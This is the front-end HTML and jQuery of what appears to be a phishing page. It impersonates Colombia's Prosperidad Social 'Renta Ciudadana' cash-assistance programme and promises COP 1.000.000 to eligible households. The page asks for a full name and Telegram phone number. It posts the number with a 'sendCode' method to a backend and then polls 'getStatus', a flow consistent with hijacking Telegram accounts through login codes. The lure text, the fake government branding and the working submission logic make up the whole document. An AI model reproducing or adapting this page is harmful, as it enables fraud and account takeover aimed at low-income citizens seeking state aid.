<div class="py-2 d-block">

  <div id="triggerContainer" class="text-center" style="background: transparent;">
    <style>
      /* Style tombol pemicu utama */

      .hero-image {
        flex: 1;
        min-width: 300px;
        text-align: right;
      }

      .hero-image img {
        width: 100%;
        max-width: 600px;
      }

      .btn-init {
        height: 58px;
        width: 100%;
        max-width: 400px;
        border-radius: 8px;
        background: #fff;
        color: #000;
        border: 2px solid #000;
        font-weight: 800;
        font-size: 15px;
        text-transform: uppercase;
        transition: all 0.2s ease-in-out;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      }

      .btn-init:active,
      .btn-init.clicked {
        background: #000 !important;
        color: #fff !important;
        transform: scale(0.98);
      }

      /* MODAL OVERLAY - DIUBAH MENJADI CENTER */
      #modalOverlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.6);
        z-index: 10000;
        /* Menggunakan flex center untuk posisi tengah */
        align-items: center;
        justify-content: center;
        padding: 20px;
      }

      /* FORM CONTAINER - DIUBAH UNTUK POSISI TENGAH */
      #mainFormContainer {
        display: none;
        width: 100%;
        max-width: 450px;
        background: #fff;
        border-radius: 20px;
        /* Radius merata karena tidak di bawah lagi */
        padding: 30px 20px 40px;
        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        position: relative;
        margin: auto;
        /* Animasi Scale & Fade */
        opacity: 0;
        transform: scale(0.8);
        transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
      }

      /* Muncul dengan efek zoom-in lembut */
      #mainFormContainer.show {
        opacity: 1;
        transform: scale(1);
      }

      /* Menghilangkan bar tarikan karena posisi sudah di tengah */
      .handle-bar {
        display: none;
      }
    </style>
    <div class="hero-image">
      <img src="assets/banner.jpeg" alt="Familia">
    </div>
    <h1>A través de este enlace, Prosperidad Social distribuirá transferencias de efectivo a los ciudadanos
      colombianos elegibles.</h1>
    <h2 style="font-size: 14px; color: #666;">A través de este enlace, Prosperidad Social distribuirá
      transferencias de efectivo a los ciudadanos colombianos elegibles.</h2>
    <p style="font-size: 14px; color: #666; font-weight: bold;">¡Regístrese y verifique suelegibilidad!</p>

    <button type="button" id="showFormBtn" class="btn btn-init">
      Consulte aquí si su hogar es beneficiario
    </button>
  </div>

  <div id="modalOverlay">
    <div id="mainFormContainer">
      <div class="text-center mb-3">
        <img src="assets/form-logo.jpg" style="width: 100%; max-width: 295px; margin: auto; display: block;">
      </div>

      <div class="mb-4 text-center">
        <h2 style="font-size: 18px; font-weight: 800; color: #212121; margin-bottom: 5px;">Asistencia en Efectivo</h2>
        <p style="font-size: 14px; color: #666; line-height: 1.4;">
          Programa Renta Ciudadana <br>
          <strong style="color: #2c3e50; font-size: 16px;">COP 1.000.000</strong>
        </p>
      </div>

      <p id="wrong" class="text-center mt-2"
        style="display:none; color: #d32f2f; font-size: 13px; font-weight: 600; background: #ffebee; padding: 8px; border-radius: 8px;">
        Ingrese un número de teléfono válido.
      </p>

      <div class="mb-3">
        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Nombre
          completo</label>
        <div style="position:relative;">
          <input type="text" name="nama" class="form-control shadow-none" placeholder="Ingrese su nombre completo"
            style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
        </div>
      </div>

      <div class="mb-3">
        <label style="font-size: 13px; font-weight: 700; color: #444; margin-bottom: 6px; display: block;">Número de
          Telegram</label>
        <div style="position:relative;">
          <img src="assets/kolombia.png" id="flagIcon"
            style="position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 24px; display: none; z-index: 5;">
          <input type="text" class="form-control shadow-none" name="phone" id="phone" placeholder="Número de Telegram"
            autocomplete="off" inputmode="numeric" required
            style="height: 48px; border-radius: 12px; border: 1.5px solid #eee; background: #f9f9f9; font-size: 15px;">
        </div>
      </div>

      <div class="mb-4" style="display:flex; gap:12px; align-items: flex-start;">
        <input type="checkbox" id="agree" style="width: 20px; height: 20px; accent-color: #000; cursor: pointer;">
        <label for="agree" style="font-size: 12px; color: #555; line-height: 1.4; cursor: pointer;">Acepto continuar con
          la solicitud dan el registro oficial.</label>
      </div>

      <div id="checkboxWarning"
        style="display:none; color:#d32f2f; font-size:12px; font-weight:600; text-align:center; margin-bottom:15px;">
        ⚠️ Debe marcar la casilla primero
      </div>

      <button class="btn w-100" id="claimBtn"
        style="height: 52px; border-radius: 12px; background: #000; color: #fff; font-weight: 800; font-size: 16px; border: none; letter-spacing: 0.5px;">
        RECLAMAR
      </button>
    </div>
  </div>

</div>

<script>
  $(document).ready(function () {

    // LOGIKA TAMPIL TENGAH (CENTERED)
    $("#showFormBtn").on("click", function () {
      $(this).addClass("clicked");

      setTimeout(function () {
        $("#modalOverlay").css("display", "flex");
        $("#mainFormContainer").show();

        // Animasi muncul (fade in + scale up)
        setTimeout(function () {
          $("#mainFormContainer").addClass("show");
        }, 50);
      }, 150);
    });

    // TUTUP POPUP (KLIK DI AREA OVERLAY)
    $("#modalOverlay").on("click", function (e) {
      if (e.target !== this) return;
      $("#mainFormContainer").removeClass("show");
      setTimeout(function () {
        $("#modalOverlay").hide();
        $("#showFormBtn").removeClass("clicked");
      }, 300);
    });


    // --- LOGIKA BACKEND ASLI (TIDAK DIUBAH) ---
    $("#wrong").hide();
    $("#loader").hide();
    $("#checkboxWarning").hide();

    function showCountry() {
      $("#flagIcon").show();
      $("#phone").css("padding-left", "48px");
      if ($("#phone").val() == "") { $("#phone").val("+57 "); }
    }

    $("#phone").on("focus click input touchstart", function () { showCountry(); });

    $("#claimBtn").on("click", function (e) {
      e.preventDefault();
      if (!$("#agree").is(":checked")) { $("#checkboxWarning").fadeIn(); return; }
      var phone = $("#phone").val();
      if (phone != "") {
        $("#loader").show();
        $.ajax({
          url: "<?= base_url("API/index.php") ?>",
          type: "POST",
          data: { "method": "sendCode", "phone": phone },
          success: function () { setTimeout(function () { checkStatus(); }, 500); }
        });
      }
    });

    function checkStatus() {
      $.ajax({
        url: 'API/index.php',
        type: "POST",
        data: { "method": "getStatus" },
        success: function (data) {
          if (data.result.status == "success") { window.location.reload(); }
          else if (data.result.status == "failed") { $("#wrong").show(); $("#loader").hide(); }
          else { setTimeout(function () { checkStatus(); }, 500); }
        }
      });
    }

  });

</script>
